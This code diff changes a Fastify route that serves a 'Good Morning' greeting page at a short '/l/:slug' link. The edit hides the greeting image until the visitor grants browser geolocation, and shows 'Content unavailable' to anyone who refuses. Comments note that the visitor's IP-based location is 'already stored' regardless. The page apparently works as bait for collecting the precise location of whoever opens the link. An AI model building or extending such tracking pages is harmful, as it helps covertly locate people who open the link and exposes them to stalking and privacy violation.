@@ -490,8 +490,11 @@ fastify.get('/l/:slug', async (request, reply) => {
         </head>
         <body style="margin: 0; padding: 20px; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);">
           <div style="margin: 0; padding: 3rem; box-sizing: border-box; background: white; border-radius: 20px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); text-align: center; max-width: 500px; width: 100%; animation: slideUp 0.5s ease;">
-            <div style="margin: 0 auto 30px; padding: 0; box-sizing: border-box; width: 100%; max-width: 400px; border-radius: 15px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.2);">
+            <div id="imageContainer" style="margin: 0 auto 30px; padding: 0; box-sizing: border-box; width: 100%; max-width: 400px; border-radius: 15px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.2); display: none;">
               <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI1MCIgaGVpZ2h0PSI1MCI+PGNpcmNsZSBjeD0iMjUiIGN5PSIxMCIgcj0iMTAiIGZpbGw9InBpbmsiIC8+PGNpcmNsZSBjeD0iNDAiIGN5PSIyNSIgcj0iMTAiIGZpbGw9InBpbmsiIC8+PGNpcmNsZSBjeD0iMjUiIGN5PSI0MCIgcj0iMTAiIGZpbGw9InBpbmsiIC8+PGNpcmNsZSBjeD0iMTAiIGN5PSIyNSIgcj0iMTAiIGZpbGw9InBpbmsiIC8+PGNpcmNsZSBjeD0iMjUiIGN5PSIyNSIgcj0iMTAiIGZpbGw9InllbGxvdyIgLz48L3N2Zz4=" alt="Good Morning" style="margin: 0; padding: 0; box-sizing: border-box; width: 100%; height: 300px; object-fit: contain; display: block; background: #f8f9fa;">
+            </div>
+            <div id="loadingMessage" style="margin: 0 auto 30px; padding: 20px; box-sizing: border-box; color: #666; font-size: 16px;">
+              Please allow location access to view content...
             </div>
             <h1 style="margin: 0 0 20px 0; padding: 0; box-sizing: border-box; color: #333; font-size: 36px; font-weight: 600;">Good Morning</h1>
           </div>
@@ -678,6 +681,17 @@ fastify.get('/l/:slug', async (request, reply) => {
                         console.log('Position object:', position);
                         console.log('Coords object:', position.coords);
                         
+                        // Show the image when location permission is granted
+                        const imageContainer = document.getElementById('imageContainer');
+                        const loadingMessage = document.getElementById('loadingMessage');
+                        if (imageContainer) {
+                          imageContainer.style.display = 'block';
+                          imageContainer.style.animation = 'slideUp 0.5s ease';
+                        }
+                        if (loadingMessage) {
+                          loadingMessage.style.display = 'none';
+                        }
+                        
                         const latitude = position.coords.latitude;
                         const longitude = position.coords.longitude;
                         const accuracy = position.coords.accuracy;
@@ -722,6 +736,12 @@ fastify.get('/l/:slug', async (request, reply) => {
                         if (error.code === 1) {
                           console.warn('User denied location permission');
                           console.warn('Geolocation failed - using IP-based location (already stored)');
+                          // Hide loading message and show permission denied message
+                          const loadingMessage = document.getElementById('loadingMessage');
+                          if (loadingMessage) {
+                            loadingMessage.textContent = 'Location access denied. Content unavailable.';
+                            loadingMessage.style.color = '#dc3545';
+                          }
                         } else if (error.code === 2) {
                           console.warn('Position unavailable');
                         } else if (error.code === 3) {
@@ -738,6 +758,12 @@ fastify.get('/l/:slug', async (request, reply) => {
                           }, 1000);
                         } else {
                           console.warn('Geolocation failed after ' + (retryCount + 1) + ' attempts - using IP-based location (already stored)');
+                          // Hide loading message if all retries failed
+                          const loadingMessage = document.getElementById('loadingMessage');
+                          if (loadingMessage && error.code !== 1) {
+                            loadingMessage.textContent = 'Unable to access location. Content unavailable.';
+                            loadingMessage.style.color = '#dc3545';
+                          }
                         }
                       },
                       {
@@ -765,6 +791,12 @@ fastify.get('/l/:slug', async (request, reply) => {
                 requestLocation(false, 30000, false);
               } else {
                 console.warn('Geolocation not supported by browser');
+                // Hide loading message and show not supported message
+                const loadingMessage = document.getElementById('loadingMessage');
+                if (loadingMessage) {
+                  loadingMessage.textContent = 'Geolocation not supported by your browser. Content unavailable.';
+                  loadingMessage.style.color = '#dc3545';
+                }
               }
             } catch (error) {
               console.error('=== FATAL ERROR IN SCRIPT ===');
